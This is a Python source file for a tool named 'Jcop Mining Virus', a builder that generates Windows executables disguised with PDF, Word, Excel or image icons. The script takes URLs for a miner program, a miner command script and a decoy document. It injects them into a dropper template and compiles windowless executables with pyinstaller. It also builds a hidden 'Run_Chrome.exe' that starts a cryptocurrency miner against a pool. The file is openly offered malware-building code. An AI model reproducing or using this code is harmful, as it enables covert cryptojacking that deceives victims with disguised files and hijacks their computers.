import os
import sys
import time
import random, string
from bin.settings import GREEN, WHITE, BLUE, RED,  END

def clear():
    os.system('cls')

def heading():
    clear()

    sys.stdout.write(BLUE + '''

        ..`                                       
         ./sso/-`                                 
            ./yyy+:-                                    ''' + WHITE + '''   Jcop Mining Virus v1.0''' + BLUE + '''
              `+yyyy/                                   ''' + WHITE + '''   (C) 2020. ''' + BLUE + "Inpyo Lee (" + WHITE + "mynameispyo" + BLUE + ")" + WHITE + ''' all rights reserved  ''' + BLUE + '''
            `-oyysyyy.                                  ''' + WHITE + '''   Email:''' + BLUE + '''admin@page.ml
          ./syyo:`.syy`                           
       `-oyyy+.    `oy/                           
     ./syys:`        os                           
  `-oyyyo-`          `+                     .:oo+/
  `oys/.                  ``.------.``   `:oyyyyyy
    .`                  .-://////////:-`:syyyyyyyy         [''' + WHITE + "D" + BLUE +'''] Generate Mining Virus
                      `://///////////--oyyyyyyyyyy         [''' + WHITE + "G" + BLUE +'''] Generate Miner Command Script
                     `://///:--..`-//`oyyyyyyyyyyy         [''' + WHITE + "U" + BLUE +'''] Update   
                     ://///. `:/: `:/`yyyyyyyyyyyy         [''' + WHITE + "E" + BLUE +'''] Exit
                     //////:` .-...``:yyyyyyyyyyyy         
                     ://////:` .//: :yyyyyyyyyyyyy
                     .--::::/:  -:/oyyyyyyyyyyyyyy
                   .:+sooo++//osyyyyyyyyyyyyyyyyyy
                -+syyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
               :yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
              -yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy   
\n
''' + END)
    print ("Select an option from menu:\n")
    
########
def gen():
    sys.stdout.write(WHITE + '\n[' + BLUE + '1' + WHITE + ']' + BLUE + ' PDF' + WHITE + ' - Drop mining program, hide it and open your customm pdf.')
    sys.stdout.write(WHITE + '\n[' + BLUE + '2' + WHITE + ']' + BLUE + ' WORD' + WHITE + ' - Drop mining program, hide it and open your custom docx.')    
    sys.stdout.write(WHITE + '\n[' + BLUE + '3' + WHITE + ']' + BLUE + ' EXCEL' + WHITE + ' - Drop mining program, hide it and open your custom xlsx.')
    sys.stdout.write(WHITE + '\n[' + BLUE + '4' + WHITE + ']' + BLUE + ' IMAGE' + WHITE + ' - Drop mining program, hide it and open your custom jpg/png.\n' + END)
########
def pp():
    sys.stdout.write(BLUE + '''
    \n
    \n
    \n
    \n
          THANK YOU FOR USING [JCOP MINING VIRUS]''' + WHITE + '''
      https://github.com/mynameispyo/JcopMiningVirus''' + GREEN + '''
                       @mynameispyo
    \n
    \n
    \n
    \n
    \n
''' + END)
def begin():
    print('\n[!] Attemption put direct url! ex: http://192.168.1.2/mal.exe or https://domain.com/run.exe')
    print ('\n[*] Remember to include the http or https.\n')
    miner_url = input('Insert url from miner exe: ')
    run_url = input('Insert url from  miner command script: ')
    img_url = input('Insert url from file to embed: ')
    if 'pdf' in img_url:
        nameph = '.pdf'
    if 'docx' in img_url:
        nameph = '.docx'
    if 'xlsx' in img_url:
        nameph = '.xlsx'
    if 'jpg' in img_url:
        nameph = '.jpg'
    if 'png' in img_url:
        nameph = '.png'
    template = open('Templates/U_dRoP.py', 'r')
    o = template.read()

    payload = ''
    payload += 'img_url = ' + "'" + img_url + "'" + '\n'
    payload += 'run_url = ' + "'" + run_url + "'" + '\n'
    payload += 'miner_url = ' + "'" + miner_url + "'" + '\n'
    payload += 'nameph = ' + "'" + "Chrome" + nameph + "'" + '\n'
    payload += str(o)

    with open('D' + '.py', 'w') as f:
        f.write(payload)
        f.close()	
    template.close()

def genVirus(TYPE):
    begin()
    os.system(f'pyinstaller.exe --onefile --noconsole --windowed --icon=Icons/{TYPE}.ico D.py')
    os.system('rmdir /s build')
    os.system('del D.spec D.py')
    name = f'{TYPE}_.{TYPE}.exe'
    os.rename('dist/D.exe', 'dist/' + name)
    clear()
    print ('{0}[*] Done! Saved to:  {1}'.format(BLUE, END) + 'dist/' + name)
    quit = input('Do You want quit or back to main?(Q/B)')
    if quit.upper() == 'Q':
        clear()
        pp()
        sys.exit(0)
    elif quit.upper() == 'B':
        main()
    
def genRunScript():
    print('\n[!] Attemption put command of miner ex: Chrome.exe -a neoscrypt -o stratum+tcp://POOL -u USER -p x')
    print ('\n[*] Name of exe file must be Chrome.exe\n')
    command = input('Insert command of miner: ')
    template = open('Templates/Run_Script.py', 'r')
    o = template.read()

    payload = ''
    payload += 'command = ' + "'" + command + "'" + '\n'
    payload += str(o)

    with open('Run_Script' + '.py', 'w') as f:
        f.write(payload)
        f.close()	
    template.close()

    os.system(f'pyinstaller.exe --onefile --noconsole --windowed --icon=Icons/chrome.ico Run_Script.py')
    os.system('rmdir /s build')
    os.system('del Run_Script.spec Run_Script.py')
    name = f'Run_Chrome.exe'
    os.rename('dist/Run_Script.exe', 'dist/' + name)
    clear()
    print ('{0}[*] Done! Saved to:  {1}'.format(BLUE, END) + 'dist/' + name)
    quit = input('Do You want quit or back to main?(Q/B)')
    if quit.upper() == 'Q':
        clear()
        pp()
        sys.exit(0)
    elif quit.upper() == 'B':
        main()

def main():
    clear()  
    heading()
    try:

        while True:

            header = ('\n{0} JMV {1} ~ {2}'.format(BLUE, WHITE, END))
            choice = input(header)
            
            if choice.upper() == 'Q' or choice.upper() == 'QUIT':
                clear()
                pp()
                raise SystemExit
            elif choice.upper() == 'E' or choice.upper() == 'EXIT':
                clear()
                pp()
                raise SystemExit
            elif choice.upper() == 'D':
                gen()
            elif choice.upper() == 'G':
                genRunScript()
            elif choice.upper() == 'U':
                os.system('python updater.py')
            elif choice.upper() == 'B':
                main()
            elif choice == '1':   
                genVirus("pdf")
            elif choice == '2':   
                genVirus("docx")
            elif choice == '3':   
                genVirus("xlsx")
            elif choice == '4':   
                genVirus("png")
            else:                   
                print('\n [!] Invalid Option \n')
                    
 

    except KeyboardInterrupt:
        clear()
        pp()
        sys.exit(0)


if __name__ == '__main__':
    main()
